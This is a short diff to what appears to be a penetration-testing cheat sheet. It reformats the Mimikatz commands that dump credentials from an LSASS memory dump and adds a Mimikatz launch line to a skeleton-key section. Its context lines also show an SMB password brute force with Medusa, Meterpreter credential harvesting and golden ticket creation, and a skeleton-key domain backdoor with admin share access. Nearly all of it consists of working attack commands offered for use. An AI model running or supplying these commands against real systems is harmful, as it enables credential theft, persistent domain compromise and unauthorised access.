@@ -424,9 +424,9 @@ $ medusa -h <RHOST> -U usernames.txt -P wordlist.txt -M smbnt
 ### Dump Hshes
 
 ```c
-$ mimikatz.exe
-$ sekurlsa::minidump /users/admin/Desktop/lsass.DMP
-$ sekurlsa::LogonPasswords
+C:\> .\mimikatz.exe
+mimikatz # sekurlsa::minidump /users/admin/Desktop/lsass.DMP
+mimikatz # sekurlsa::LogonPasswords
 meterpreter > getprivs
 meterpreter > creds_all
 meterpreter > golden_ticket_create
@@ -457,6 +457,7 @@ C:\> dir \\<RHOST>\admin$
 ### Skeleton Key
 
 ```c
+C:\> .\mimikatz.exe
 mimikatz # privilege::debug
 mimikatz # misc::skeleton
 C:\> net use C:\\<RHOST>\admin$ /user:Administrator mimikatz
